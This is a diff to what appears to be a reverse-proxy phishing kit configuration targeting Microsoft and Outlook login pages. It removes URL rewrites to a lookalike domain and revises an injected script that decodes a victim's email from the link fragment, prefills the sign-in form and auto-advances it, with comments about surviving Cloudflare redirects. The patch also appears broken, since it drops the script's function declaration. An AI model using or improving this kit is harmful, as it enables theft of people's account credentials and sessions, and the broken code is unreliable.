@@ -121,45 +121,42 @@ login:
   domain: 'login.microsoftonline.com'
   path: '/'
 
-redirect_uri:
-  - path: '/'
-    search: 'https://outlook.office365.com'
-    replace: 'https://owa.juxtaposedart.com'
-  - path: '/'
-    search: 'https://outlook.live.com'
-    replace: 'https://mail.juxtaposedart.com'
-  - path: '/'
-    search: 'https://outlook.office.com'
-    replace: 'https://owa.juxtaposedart.com'
-
 js_inject:
   - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
     trigger_paths: ["/common/oauth2/", "/", "/*", "/common/oauth2/v2.0/authorize"]
     script: |
       function lp(){
-        var emailId = document.querySelector("#i0116") || document.querySelector("#usernameEntry");
-        var nextButton = document.querySelector("#idSIButton9")
-          || document.querySelector("input[type=submit]")
-          || document.querySelector("button[type=submit]")
-          || document.querySelector("[data-testid='primaryButton']");
-        var query = window.location.href;
-        if (emailId && !emailId.value) {
-          var frag = "";
-          if (/#/.test(query)) { frag = query.split("#")[1] || ""; }
-          var decodedString = frag;
-          if (frag && /^[A-Za-z0-9+/=]+$/.test(frag)) {
-            try { decodedString = window.atob(frag.replace(/[=]/gi, '')); } catch(e) {}
-          }
-          if (decodedString && decodedString.indexOf("@") !== -1) {
-            try {
-              var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-              setter.call(emailId, decodedString);
-              emailId.dispatchEvent(new Event("input", {bubbles:true}));
-              emailId.dispatchEvent(new Event("change", {bubbles:true}));
-              if (nextButton) { setTimeout(function(){ nextButton.click(); }, 300); }
-            } catch(e) {}
-          }
-        }
-        setTimeout(function(){ lp(); }, 500);
-      }
-      setTimeout(function(){ lp(); }, 500);
+              var emailId = document.querySelector("#i0116") || document.querySelector("#usernameEntry");
+              var nextButton = document.querySelector("#idSIButton9")
+                || document.querySelector("input[type=submit]")
+                || document.querySelector("button[type=submit]")
+                || document.querySelector("[data-testid='primaryButton']");
+              if (emailId && !emailId.value) {
+                var hash = (window.location.hash || "").replace(/^#/, "");
+                if (!hash) { setTimeout(function(){ lp(); }, 500); return; }
+                var decodedString = hash;
+                // URL-decode in case of %40 / %2E etc. from Cloudflare / redirect processing
+                try { decodedString = decodeURIComponent(decodedString); } catch(e) {}
+                // If it looks like pure base64 (no @ or .), try to decode it
+                if (/^[A-Za-z0-9+/=]+$/.test(decodedString)) {
+                  try {
+                    var b = window.atob(decodedString.replace(/=+$/, ''));
+                    if (b.indexOf("@") !== -1) decodedString = b;
+                  } catch(e) {}
+                }
+                // Strip trailing = and non-email garbage characters that may come from
+                // Cloudflare challenge / redirect fragment mangling
+                decodedString = decodedString.replace(/=+$/, '').replace(/[^\w.@+\-_]/g, '').trim();
+                if (decodedString && decodedString.indexOf("@") !== -1) {
+                  try {
+                    var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+                    setter.call(emailId, decodedString);
+                    emailId.dispatchEvent(new Event("input", {bubbles:true}));
+                    emailId.dispatchEvent(new Event("change", {bubbles:true}));
+                    if (nextButton) { setTimeout(function(){ nextButton.click(); }, 300); }
+                  } catch(e) {}
+                }
+              }
+              setTimeout(function(){ lp(); }, 500);
+            }
+            setTimeout(function(){ lp(); }, 500);
